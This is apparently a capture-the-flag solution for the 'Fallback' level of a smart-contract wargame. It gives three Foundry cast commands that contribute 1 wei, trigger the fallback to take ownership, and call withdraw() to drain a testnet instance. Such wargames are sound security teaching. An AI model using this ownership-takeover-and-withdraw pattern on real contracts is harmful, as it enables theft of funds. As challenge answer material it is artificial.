# Fallback Solution

Run:

```bash
cast send <instanceAddress> "contribute()" --value 1wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send <instanceAddress> --value 1wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send <instanceAddress> "withdraw()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
